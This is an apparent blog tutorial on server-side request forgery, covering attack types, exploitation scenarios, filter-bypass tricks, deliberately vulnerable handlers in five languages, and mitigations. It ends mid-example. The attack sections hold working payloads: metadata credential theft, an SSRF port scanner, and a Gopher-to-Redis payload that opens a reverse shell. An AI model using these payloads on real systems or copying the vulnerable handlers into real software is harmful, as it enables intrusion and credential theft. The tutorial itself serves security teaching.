---
title: "Server-Side Request Forgery (SSRF) — A Complete Guide"
description: "A comprehensive guide to understanding, exploiting, and mitigating Server-Side Request Forgery (SSRF) vulnerabilities in modern web applications."
date: 2024-01-15 10:00:00 +0000
categories: [Web Security, Vulnerabilities]
tags: [ssrf, web-security, owasp, bug-bounty, penetration-testing]
pin: true
math: false
mermaid: true
image:
  path: /assets/img/posts/ssrf-banner.png
  alt: "Server-Side Request Forgery (SSRF) Attack Illustration"
---

## What is SSRF?

**Server-Side Request Forgery (SSRF)** is a web security vulnerability that allows an attacker to **induce the server-side application** to make HTTP requests to an arbitrary domain or internal resource of the attacker's choosing.

In a typical SSRF attack, the attacker might cause the server to:

- Connect to **internal-only services** within the organization's infrastructure
- Access **cloud metadata endpoints** to steal credentials
- Interact with **internal APIs** not exposed to the internet
- **Scan internal networks** and discover hidden services
- Execute further attacks like **Remote Code Execution (RCE)**

> SSRF was listed as **#10** in the [OWASP Top 10 (2021)](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) — highlighting its growing impact on modern cloud-native web applications.
{: .prompt-info }

---

## Simple Analogy

Imagine you call a company's receptionist and ask them to dial an **internal extension** that is not accessible from outside. The receptionist, trusting your request, connects you to that internal line. That is essentially what SSRF does — it tricks the server into accessing resources that should not be reachable from the outside.

---

## How Does SSRF Work?

### Visual Attack Flow

```mermaid
sequenceDiagram
    participant A as Attacker
    participant V as Vulnerable Server
    participant I as Internal Service

    A->>V: Sends crafted request with malicious URL
    V->>I: Fetches the crafted URL (server-side)
    I-->>V: Returns sensitive data (keys, tokens, configs)
    V-->>A: Forwards the response back to attacker
```

### The Attack Flow — Step by Step

| Step | Action |
|------|--------|
| 1 | Application accepts a URL parameter from the user |
| 2 | Server fetches the resource at that URL (server-side) |
| 3 | Attacker replaces the URL with an internal/malicious target |
| 4 | Server unknowingly fetches and returns the sensitive resource |
| 5 | Attacker reads internal data, credentials, or executes further attacks |

### Architecture Diagram

```mermaid
graph LR
    A[Attacker] -->|Malicious URL| B[Vulnerable Web App]
    B -->|Server-Side Request| C[Internal Service / Cloud Metadata]
    C -->|Sensitive Data| B
    B -->|Response| A

    style A fill:#e74c3c,stroke:#c0392b,color:#fff
    style B fill:#f39c12,stroke:#e67e22,color:#fff
    style C fill:#2ecc71,stroke:#27ae60,color:#fff
```

---

## Types of SSRF

### 1. In-Band SSRF (Full Response)

The response from the internal/external request is **returned directly** to the attacker in the HTTP response.

**Example Request:**

```http
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: vulnerable-app.com
User-Agent: Mozilla/5.0
Accept: */*
```

**Example Response:**

```text
ami-id
ami-launch-index
ami-manifest-path
hostname
iam/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
network/
placement/
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
```

The server fetched the AWS metadata endpoint and returned the full result to the attacker.

---

### 2. Blind SSRF

The attacker **does not** see the response body, but can still trigger server-side requests. The server makes the request, but the response is not reflected back.

**Detection methods for Blind SSRF:**

- **Out-of-band (OOB) interactions** — using tools like Burp Collaborator or interact.sh
- **Time-based inference** — measuring response time differences
- **Error-based inference** — different error messages for open vs closed ports

**Example — Blind SSRF with Burp Collaborator:**

```http
POST /api/webhook HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "callback_url": "http://your-collaborator-id.burpcollaborator.net"
}
```

**Example — Blind SSRF with interact.sh:**

```bash
# Start interactsh client
interactsh-client

# Use the generated URL as your SSRF payload
# Example: http://abc123.interact.sh

curl "https://vulnerable-app.com/api/fetch?url=http://abc123.interact.sh"
```

If you receive a DNS or HTTP callback on your interact.sh server, blind SSRF is confirmed.

---

### 3. Semi-Blind SSRF

The attacker gets **partial information** — such as HTTP status codes, response sizes, or error messages — but not the full response body.

**Example:**

```http
GET /api/fetch?url=http://192.168.1.50:22/ HTTP/1.1
Host: vulnerable-app.com
```

**Response when port is open:**

```json
{
  "error": "Connection refused",
  "status": 200
}
```

**Response when port is closed:**

```json
{
  "error": "Connection timed out",
  "status": 504
}
```

The difference in error messages reveals whether internal ports are open or closed.

---

## Where to Find SSRF Vulnerabilities

SSRF can hide in many application features. Here are the most common places to look:

| Feature | Example Parameter | Risk Level |
|---------|------------------|------------|
| URL Preview / Link Unfurling | `url=`, `link=`, `src=` | 🔴 High |
| Webhook Configuration | `callback_url=`, `webhook=` | 🔴 High |
| File Import from URL | `import_url=`, `file_url=` | 🔴 High |
| PDF/HTML Generators | `html=`, `template_url=` | 🔴 High |
| Image Fetch / Resize | `image_url=`, `avatar_url=` | 🟡 Medium |
| API Integrations | `api_url=`, `endpoint=` | 🟡 Medium |
| OAuth Callbacks | `redirect_uri=` | 🟡 Medium |
| XML/SVG Parsing (XXE→SSRF) | XML body with DTD | 🔴 High |
| Email Header Injection | `smtp_server=` | 🟡 Medium |

---

## Common SSRF Attack Targets

### Cloud Metadata Endpoints

| Cloud Provider | Metadata URL | What You Can Steal |
|---------------|-------------|-------------------|
| **AWS** | `http://169.254.169.254/latest/meta-data/` | IAM credentials, instance info, user-data |
| **GCP** | `http://metadata.google.internal/computeMetadata/v1/` | Service account tokens, project info |
| **Azure** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Managed identity tokens, subscription info |
| **DigitalOcean** | `http://169.254.169.254/metadata/v1/` | Droplet metadata, user-data |
| **Oracle Cloud** | `http://169.254.169.254/opc/v1/instance/` | Instance metadata |
| **Alibaba Cloud** | `http://100.100.100.200/latest/meta-data/` | Instance metadata, RAM role credentials |

### Internal Services

| Target | URL | Purpose |
|--------|-----|---------|
| Localhost Admin | `http://127.0.0.1:8080/admin` | Access internal admin panels |
| Internal APIs | `http://internal-api.local/v1/users` | Access internal REST APIs |
| Databases | `http://127.0.0.1:5984/_all_dbs` (CouchDB) | List all databases |
| Cache Servers | `http://127.0.0.1:11211/` (Memcached) | Read cached data |
| Message Queues | `http://127.0.0.1:15672/` (RabbitMQ) | Access management interface |
| Kubernetes API | `https://kubernetes.default.svc/` | Access cluster API |

> **Cloud metadata endpoints are the #1 target** in SSRF attacks. A single SSRF to `169.254.169.254` can compromise an entire AWS account.
{: .prompt-danger }

---

## Real-World SSRF Exploitation

### Scenario 1: Stealing AWS IAM Credentials

Many web applications have features like "Import from URL", "Preview link", or "Webhook URL". An attacker can abuse these to access the AWS Instance Metadata Service (IMDS).

**Step 1 — Discover the IAM role name:**

```bash
curl "https://vulnerable-app.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Response:**

```text
my-ec2-role
```

**Step 2 — Fetch temporary credentials for that role:**

```bash
curl "https://vulnerable-app.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role"
```

**Response:**

```json
{
  "Code": "Success",
  "LastUpdated": "2024-01-15T12:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "FwoGZXIvYXdzEBYaDH2sYz3Mq7G9VhLKaSJVAUj...",
  "Expiration": "2024-01-15T18:00:00Z"
}
```

**Step 3 — Use the stolen credentials:**

```bash
export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBYaDH2sYz3Mq7G9VhLKaSJVAUj..."

# List S3 buckets
aws s3 ls

# List EC2 instances
aws ec2 describe-instances --region us-east-1

# Read secrets
aws secretsmanager list-secrets
```

---

### Scenario 2: Stealing GCP Service Account Token

```bash
# Fetch access token (note the required header)
curl "https://vulnerable-app.com/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

**Response:**

```json
{
  "access_token": "ya29.c.ElqBBw...",
  "expires_in": 3600,
  "token_type": "Bearer"
}
```

**Use the token:**

```bash
curl -H "Authorization: Bearer ya29.c.ElqBBw..." \
  "https://www.googleapis.com/storage/v1/b?project=my-project"
```

---

### Scenario 3: Internal Port Scanning via SSRF

```python
#!/usr/bin/env python3
"""
SSRF-based Internal Port Scanner
Use responsibly and only on authorized targets.
"""

import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET_APP = "https://vulnerable-app.com/api/fetch?url="
INTERNAL_HOST = "http://192.168.1.1"
PORTS = range(1, 10001)
THREADS = 50
TIMEOUT = 5

def scan_port(port):
    """Scan a single port via SSRF."""
    url = f"{TARGET_APP}{INTERNAL_HOST}:{port}/"
    try:
        response = requests.get(url, timeout=TIMEOUT)
        if response.status_code != 500 and "Connection refused" not in response.text:
            return port, response.status_code, len(response.text)
    except requests.exceptions.Timeout:
        return port, "FILTERED", 0
    except Exception:
        pass
    return None

def main():
    print(f"[*] Scanning {INTERNAL_HOST} via SSRF...")
    print(f"[*] Ports: 1-10000 | Threads: {THREADS}")
    print("-" * 50)

    open_ports = []

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(scan_port, port): port for port in PORTS}

        for future in as_completed(futures):
            result = future.result()
            if result:
                port, status, size = result
                print(f"[OPEN] Port {port:>5} | Status: {status} | Size: {size}")
                open_ports.append(result)

    print("-" * 50)
    print(f"[*] Scan complete. {len(open_ports)} open ports found.")

if __name__ == "__main__":
    main()
```

**Example Output:**

```text
[*] Scanning http://192.168.1.1 via SSRF...
[*] Ports: 1-10000 | Threads: 50
--------------------------------------------------
[OPEN] Port    22 | Status: 200 | Size: 43
[OPEN] Port    80 | Status: 200 | Size: 11524
[OPEN] Port   443 | Status: 200 | Size: 11524
[OPEN] Port  3306 | Status: 200 | Size: 87
[OPEN] Port  5432 | Status: 200 | Size: 65
[OPEN] Port  6379 | Status: 200 | Size: 142
[OPEN] Port  8080 | Status: 200 | Size: 3847
[OPEN] Port  8443 | Status: 200 | Size: 2156
[OPEN] Port  9200 | Status: 200 | Size: 498
--------------------------------------------------
[*] Scan complete. 9 open ports found.
```

---

### Scenario 4: Accessing Internal Admin Panels

```http
POST /api/proxy HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json
Cookie: session=abc123

{
  "url": "http://localhost:8080/admin"
}
```

**Response:**

```html
<html>
<head><title>Admin Panel</title></head>
<body>
  <h1>Internal Administration</h1>
  <ul>
    <li><a href="/admin/users">Manage Users</a></li>
    <li><a href="/admin/config">System Configuration</a></li>
    <li><a href="/admin/delete-user?id=1">Delete User</a></li>
    <li><a href="/admin/backup">Download Database Backup</a></li>
  </ul>
</body>
</html>
```

**Escalating — Delete a user via SSRF:**

```http
POST /api/proxy HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://localhost:8080/admin/delete-user?id=1"
}
```

---

### Scenario 5: Reading Local Files via file:// Protocol

```http
GET /api/fetch?url=file:///etc/passwd HTTP/1.1
Host: vulnerable-app.com
```

**Response:**

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

**Reading application source code:**

```http
GET /api/fetch?url=file:///var/www/app/config/database.yml HTTP/1.1
Host: vulnerable-app.com
```

**Response:**

```yaml
production:
  adapter: postgresql
  host: internal-db.company.local
  port: 5432
  database: app_production
  username: db_admin
  password: SuperSecretP@ssw0rd!
```

---

### Scenario 6: SSRF to RCE via Gopher + Redis

The `gopher://` protocol allows crafting raw TCP packets, which can be used to interact with services like Redis.

**Generate payload with Gopherus:**

```bash
python3 gopherus.py --exploit redis
```

**Choose: ReverseShell**

```text
Give your IP: 10.10.14.5
Give your Port: 4444
```

**Generated Payload:**

```text
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F4444%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A%2Fvar%2Fspool%2Fcron%2F%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

**Send via SSRF:**

```http
GET /api/fetch?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A... HTTP/1.1
Host: vulnerable-app.com
```

**Start listener and catch the reverse shell:**

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.100] 48234
sh-4.4$ whoami
root
sh-4.4$ id
uid=0(root) gid=0(root) groups=0(root)
```

> The `gopher://` protocol is extremely powerful for SSRF exploitation as it allows crafting raw TCP packets to interact with services like **Redis, MySQL, SMTP, FastCGI**, and more.
{: .prompt-warning }

---

## SSRF Bypass Techniques

When basic payloads are blocked by WAFs or input validation filters, attackers use various bypass techniques:

### 1. URL Encoding

```text
# Single encoding
http://127.0.0.1  →  http://%31%32%37%2e%30%2e%30%2e%31

# Double encoding
http://127.0.0.1  →  http://%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31
```

### 2. Decimal IP Notation

```text
http://127.0.0.1  →  http://2130706433
```

**Python calculation:**

```python
import struct
import socket

ip = "127.0.0.1"
decimal_ip = struct.unpack("!I", socket.inet_aton(ip))[0]
print(f"http://{decimal_ip}")
# Output: http://2130706433
```

### 3. Octal IP Notation

```text
http://127.0.0.1  →  http://0177.0.0.01
http://169.254.169.254  →  http://0251.0376.0251.0376
```

### 4. Hexadecimal IP Notation

```text
http://127.0.0.1  →  http://0x7f000001
http://127.0.0.1  →  http://0x7f.0x0.0x0.0x1
```

### 5. IPv6 Representations

```text
http://127.0.0.1  →  http://[::1]
http://127.0.0.1  →  http://[::ffff:127.0.0.1]
http://127.0.0.1  →  http://[0:0:0:0:0:ffff:127.0.0.1]
http://127.0.0.1  →  http://[::ffff:7f00:1]
```

### 6. DNS Rebinding

```text
# Domains that resolve to 127.0.0.1
http://localtest.me
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net
http://customer1.app.localhost.my.company.127.0.0.1.nip.io

# Custom DNS rebinding service
# Use tools like: https://github.com/taviso/rbndr
http://rbndr.us/dfd8a9e4
```

**How DNS rebinding works:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant V as Vulnerable Server
    participant D as Attacker's DNS
    participant I as Internal Service (127.0.0.1)

    A->>V: Request with url=http://evil.attacker.com
    V->>D: DNS lookup for evil.attacker.com
    D-->>V: First response: 1.2.3.4 (external IP - passes validation)
    V->>D: Second DNS lookup (for actual connection)
    D-->>V: Second response: 127.0.0.1 (internal IP!)
    V->>I: Connects to 127.0.0.1
    I-->>V: Returns internal data
    V-->>A: Forwards response
```

### 7. URL Shorteners & Open Redirects

```text
# URL shorteners
http://bit.ly/abc123  →  redirects to http://169.254.169.254/...
http://tinyurl.com/xyz  →  redirects to http://127.0.0.1/admin

# Open redirect chain
http://trusted-site.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

### 8. Using @ Symbol (URL Authority)

```text
http://expected-host@evil-host
http://evil-host#expected-host
http://expected-host.evil-host
http://trusted.com%23@evil.com
```

### 9. Alternative Protocols

```text
# Gopher (raw TCP)
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a

# Dict
dict://127.0.0.1:6379/info

# File
file:///etc/passwd

# TFTP
tftp://evil.com:69/file

# LDAP
ldap://127.0.0.1:389/%0astats%0aquit

# Jar (Java)
jar:http://evil.com/evil.jar!/test.txt
```

### 10. Enclosed Alphanumerics (Unicode)

```text
http://⑯⑨。②⑤④。⑯⑨。②⑤④/
http://①②⑦。⓪。⓪。①/
```

### 11. Wildcard DNS Services

```text
# All resolve to 127.0.0.1
http://127.0.0.1.nip.io
http://www.127.0.0.1.nip.io
http://127.0.0.1.sslip.io
http://app.127.0.0.1.xip.io
```

### 12. CRLF Injection in URL

```text
http://127.0.0.1%0d%0aHost:%20internal-server%0d%0a
```

### Complete Bypass Cheat Sheet

```text
# Localhost alternatives
http://127.0.0.1
http://localhost
http://127.1
http://127.000.000.001
http://0
http://0.0.0.0
http://0000
http://[::1]
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
http://2130706433
http://0x7f000001
http://0177.0.0.01
http://127.0.0.1.nip.io
http://localtest.me
http://127.127.127.127
http://0x7f.0x0.0x0.0x1
http://0177.0.0.0x1

# Cloud metadata alternatives
http://169.254.169.254
http://[::ffff:169.254.169.254]
http://169.254.169.254.nip.io
http://2852039166
http://0xa9fea9fe
http://0251.0376.0251.0376
http://0xA9.0xFE.0xA9.0xFE
```

---

## Vulnerable Code Examples

### Python (Flask) — Vulnerable

```python
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route('/api/fetch')
def fetch_url():
    """
    VULNERABLE: No input validation on user-supplied URL.
    An attacker can provide any URL including internal resources.
    """
    url = request.args.get('url')

    if not url:
        return jsonify({"error": "URL parameter is required"}), 400

    try:
        # Directly fetching user-supplied URL — VULNERABLE!
        response = requests.get(url, timeout=10)
        return jsonify({
            "status_code": response.status_code,
            "content": response.text,
            "headers": dict(response.headers)
        })
    except requests.exceptions.RequestException as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/webhook', methods=['POST'])
def set_webhook():
    """
    VULNERABLE: Webhook URL is not validated.
    """
    data = request.get_json()
    webhook_url = data.get('url')

    # Server makes request to attacker-controlled URL — VULNERABLE!
    try:
        response = requests.post(webhook_url, json={"event": "test"}, timeout=5)
        return jsonify({"message": "Webhook configured", "response": response.status_code})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/preview')
def preview_link():
    """
    VULNERABLE: URL preview feature without validation.
    """
    url = request.args.get('url')

    # Fetch page title and description — VULNERABLE!
    response = requests.get(url, timeout=10)
    return jsonify({
        "url": url,
        "content_length": len(response.text),
        "status": response.status_code,
        "body": response.text[:500]
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

---

### Node.js (Express) — Vulnerable

```javascript
const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

// VULNERABLE: No input validation on user-supplied URL
app.get('/api/fetch', async (req, res) => {
    const url = req.query.url;

    if (!url) {
        return res.status(400).json({ error: 'URL parameter is required' });
    }

    try {
        // Directly fetching user-supplied URL — VULNERABLE!
        const response = await axios.get(url, { timeout: 10000 });
        res.json({
            status: response.status,
            data: response.data,
            headers: response.headers
        });
    } catch (error) {
        res.status(500).json({
            error: error.message,
            // Leaking internal error details — also bad!
            details: error.response ? error.response.data : null
        });
    }
});

// VULNERABLE: Webhook without URL validation
app.post('/api/webhook', async (req, res) => {
    const { callback_url, event_type } = req.body;

    try {
        // Server makes request to attacker-controlled URL — VULNERABLE!
        const response = await axios.post(callback_url, {
            event: event_type,
            timestamp: new Date().toISOString()
        });
        res.json({ message: 'Webhook delivered', status: response.status });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// VULNERABLE: Image proxy without validation
app.get('/api/image-proxy', async (req, res) => {
    const imageUrl = req.query.src;

    try {
        // Fetching arbitrary URLs as images — VULNERABLE!
        const response = await axios.get(imageUrl, {
            responseType: 'arraybuffer',
            timeout: 10000
        });
        res.set('Content-Type', response.headers['content-type']);
        res.send(response.data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch image' });
    }
});

app.listen(3000, () => {
    console.log('Server running on port 3000');
});
```

---

### Java (Spring Boot) — Vulnerable

```java
package com.example.vulnerable;

import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.net.*;

@RestController
@RequestMapping("/api")
public class FetchController {

    /**
     * VULNERABLE: No input validation on user-supplied URL.
     * An attacker can provide any URL including internal resources.
     */
    @GetMapping("/fetch")
    public String fetchUrl(@RequestParam String url) throws Exception {
        // Directly fetching user-supplied URL — VULNERABLE!
        URL obj = new URL(url);
        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);

        int responseCode = conn.getResponseCode();

        BufferedReader in = new BufferedReader(
            new InputStreamReader(conn.getInputStream())
        );
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = in.readLine()) != null) {
            response.append(line).append("\n");
        }
        in.close();

        return String.format(
            "Status: %d\nBody:\n%s",
            responseCode,
            response.toString()
        );
    }

    /**
     * VULNERABLE: Webhook endpoint without URL validation.
     */
    @PostMapping("/webhook")
    public String setWebhook(@RequestBody WebhookRequest request) throws Exception {
        URL obj = new URL(request.getCallbackUrl());
        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setConnectTimeout(5000);

        // Send test payload to attacker-controlled URL — VULNERABLE!
        try (OutputStream os = conn.getOutputStream()) {
            byte[] payload = "{\"event\":\"test\"}".getBytes("utf-8");
            os.write(payload);
        }

        return "Webhook configured. Response: " + conn.getResponseCode();
    }
}

class WebhookRequest {
    private String callbackUrl;
    private String eventType;

    public String getCallbackUrl() { return callbackUrl; }
    public void setCallbackUrl(String callbackUrl) { this.callbackUrl = callbackUrl; }
    public String getEventType() { return eventType; }
    public void setEventType(String eventType) { this.eventType = eventType; }
}
```

---

### PHP — Vulnerable

```php
<?php
/**
 * VULNERABLE: No input validation on user-supplied URL.
 */

// fetch.php
if (isset($_GET['url'])) {
    $url = $_GET['url'];

    // Using file_get_contents — VULNERABLE!
    $content = file_get_contents($url);

    if ($content !== false) {
        echo $content;
    } else {
        http_response_code(500);
        echo json_encode(["error" => "Failed to fetch URL"]);
    }
} else {
    http_response_code(400);
    echo json_encode(["error" => "URL parameter is required"]);
}

// Using cURL — also VULNERABLE without validation!
function fetchWithCurl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);  // Follows redirects — dangerous!
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return [
        "status" => $httpCode,
        "body" => $response
    ];
}

if (isset($_GET['curl_url'])) {
    $result = fetchWithCurl($_GET['curl_url']);
    header('Content-Type: application/json');
    echo json_encode($result);
}
?>
```

---

### Go — Vulnerable

```go
package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

func fetchHandler(w http.ResponseWriter, r *http.Request) {
	url := r.URL.Query().Get("url")
	if url == "" {
		http.Error(w, "URL parameter is required", http.StatusBadRequest)
		return
	}

	// Directly fetching user-supplied URL — VULNERABLE!
	resp, err := http.Get(url)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error: %s", err.Error()), http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		http.Error(w, "Failed to read response", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/plain")
	w.Write(body)
}

func main() {
	http.HandleFunc("/api/fetch", fetchHandler)
	fmt.Println("Server running on :8080")
	http.ListenAndServe(":8080", nil)
}
```

---

## Mitigation & Prevention

### 1. Input Validation — Allowlist Approach (Recommended)

```python
from urllib.parse import urlparse

ALLOWED_DOMAINS = [
    'api.trusted-service.com',
    'cdn.example.com',
    'images.partner-site.com'
]

ALLOWED_SCHEMES = ['http', 'https']

def validate_url(url):
    """
    Validate URL against allowlist of trusted domains.
    Returns True if URL is safe, raises ValueError otherwise.
    """
    try:
        parsed = urlparse(url)
    except Exception:
        raise ValueError("Invalid URL format")

    # Check scheme
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError(f"Scheme '{parsed.scheme}' is not allowed. Only {ALLOWED_SCHEMES}")

    # Check hostname against allowlist
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError(f"Domain '{parsed.hostname}' is not in the allowlist")

    # Block URLs with authentication info
    if parsed.username or parsed.password:
        raise ValueError("URLs with credentials are not allowed")

    # Block non-standard ports
    if parsed.port and parsed.port not in [80, 443]:
        raise ValueError(f"Port {parsed.port} is not allowed")

    return True

# Usage
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route('/api/fetch')
def safe_fetch():
    url = request.args.get('url')

    try:
        validate_url(url)
    except ValueError as e:
        return jsonify({"error": str(e)}), 403

    response = requests.get(url, timeout=10)
    return jsonify({"content": response.text})
```

---

### 2. Block Internal & Private IP Ranges

```python
import ipaddress
import socket
from urllib.parse import urlparse

# All private and special-use IP ranges
BLOCKED_NETWORKS = [
    ipaddress.ip_network('0.0.0.0/8'),         # "This" network
    ipaddress.ip_network('10.0.0.0/8'),         # Private (Class A)
    ipaddress.ip_network('100.64.0.0/10'),      # Carrier-grade NAT
    ipaddress.ip_network('127.0.0.0/8'),        # Loopback
    ipaddress.ip_network('169.254.0.0/16'),     # Link-local (AWS metadata!)
    ipaddress.ip_network('172.16.0.0/12'),      # Private (Class B)
    ipaddress.ip_network('192.0.0.0/24'),       # IETF Protocol Assignments
    ipaddress.ip_network('192.0.2.0/24'),       # TEST-NET-1
    ipaddress.ip_network('192.88.99.0/24'),     # 6to4 Relay Anycast
    ipaddress.ip_network('192.168.0.0/16'),     # Private (Class C)
    ipaddress.ip_network('198.18.0.0/15'),      # Benchmarking
    ipaddress.ip_network('198.51.100.0/24'),    # TEST-NET-2
    ipaddress.ip_network('203.0.113.0/24'),     # TEST-NET-3
    ipaddress.ip_network('224.0.0.0/4'),        # Multicast
    ipaddress.ip_network('240.0.0.0/4'),        # Reserved
    ipaddress.ip_network('255.255.255.255/32'), # Broadcast
    # IPv6 ranges
    ipaddress.ip_network('::1/128'),            # IPv6 loopback
    ipaddress.ip_network('fc00::/7'),           # IPv6 unique local
    ipaddress.ip_network('fe80::/10'),          # IPv6 link-local
    ipaddress.ip_network('::ffff:0:0/96'),      # IPv4-mapped IPv6
]

def is_internal_ip(hostname):
    """
    Resolve hostname and check if it points to an internal IP address.
    Returns True if the IP is internal/private, False if public.
    """
    try:
        # Resolve hostname to IP address
        ip_str = socket.gethostbyname(hostname)
        ip = ipaddress.ip_address(ip_str)

        # Check against all blocked ranges
        for network in BLOCKED_NETWORKS:
            if ip in network:
                return True

        return False

    except (socket.gaierror, ValueError):
        # If DNS resolution fails, block it
        return True

def safe_fetch(url):
    """
    Safely fetch a URL after validating it's not pointing to internal resources.
    """
    parsed = urlparse(url)

    # Validate scheme
    if parsed.scheme not in ['http', 'https']:
        raise ValueError(f"Blocked scheme: {parsed.scheme}")

    # Validate hostname
    if not parsed.hostname:
        raise ValueError("No hostname in URL")

    # Check for IP-based bypasses
    if is_internal_ip(parsed.hostname):
        raise ValueError(f"Blocked: {parsed.hostname} resolves to an internal IP")

    # Additional check: resolve again right before making the request
    # to prevent TOCTOU (Time of Check, Time of Use) attacks
    resolved_ip = socket.gethostbyname(parsed.hostname)
    ip = ipaddress.ip_address(resolved_ip)
    for network in BLOCKED_NETWORKS:
        if ip in network:
            raise ValueError(f"Blocked: Resolved to internal IP {resolved_ip}")

    # Safe to fetch
    import requests
    response = requests.get(url, timeout=10, allow_redirects=False)
    return response
```

---

### 3. Disable Unnecessary URL Schemes

```python
ALLOWED_SCHEMES = ['http', 'https']

DANGEROUS_SCHEMES = [
    'file',     # Local file access
    'gopher',   # Raw TCP packets
    'dict',     # Dictionary service
    'ftp',      # File transfer
    'sftp',     # SSH file transfer
    'tftp',     # Trivial file transfer
    'ldap',     # Directory services
    'jar',      # Java archives
    'netdoc',   # Java network document
    'mailto',   # Email
    'telnet',   # Telnet
    'data',     # Data URIs
    'glob',     # Globbing
    'expect',   # Process interaction
    'php',      # PHP wrappers
]

def validate_scheme(url):
    """Block dangerous URL schemes."""
    parsed = urlparse(url)
    if parsed.scheme.lower() not in ALLOWED_SCHEMES:
        raise ValueError(
            f"Scheme '{parsed.scheme}' is blocked. "
            f"Only {ALLOWED_SCHEMES} are allowed."
        )
    return True
```

---

### 4. Network-Level Controls

**iptables — Block metadata access from the application:**

```bash
# Block access to AWS metadata endpoint
iptables -A OUTPUT -d 169.254.169.254 -j DROP

# Block access to all link-local addresses
iptables -A OUTPUT -d 169.254.0.0/16 -j DROP

# Block access to internal networks from web application user
iptables -A OUTPUT -m owner --uid-owner www-data -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -m owner --uid-owner www-data -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -m owner --uid-owner www-data -d 192.168.0.0/16 -j DROP
```

**AWS Security Group — Restrict outbound traffic:**

```json
{
    "SecurityGroupRules": [
        {
            "Description": "Block metadata endpoint",
            "IpProtocol": "tcp",
            "FromPort": 80,
            "ToPort": 80,
            "CidrIpv4": "169.254.169.254/32",
            "Type": "egress",
            "Action": "deny"
        }
    ]
}
```

**Docker — Network isolation:**

```yaml
# docker-compose.yml
version: '3.8'
services:
  web-app:
    image: my-web-app
    networks:
      - frontend
    # No access to internal network

  internal-api:
